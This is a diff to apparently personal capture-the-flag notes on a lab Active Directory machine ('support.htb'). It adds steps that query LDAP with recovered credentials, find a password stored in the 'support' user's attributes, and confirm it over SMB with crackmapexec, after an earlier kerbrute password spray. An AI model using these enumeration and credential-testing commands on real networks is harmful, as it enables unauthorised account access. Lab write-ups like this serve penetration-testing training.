@@ -241,4 +241,18 @@ kerbrute_linux_amd64 passwordspray usernames 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%l
 >[!example]- Result
 >![[Pasted image 20250225154148.png]]
 
-### 
+### Ldap (Using creds)
+- if we looking for information about the found users, we can see something interesting in the user 'support'
+```bash
+ldapsearch -H ldap://10.10.11.174 -x -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -D 'ldap@support.htb' -b "DC=support,DC=htb" "*"
+```
+>[!example]- Result
+>![[Pasted image 20250225162659.png]]
+
+- We test the password and perfect, is a valid password
+```bash
+crackmapexec smb 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
+```
+>[!example]- Result
+>![[Pasted image 20250225162933.png]]
+
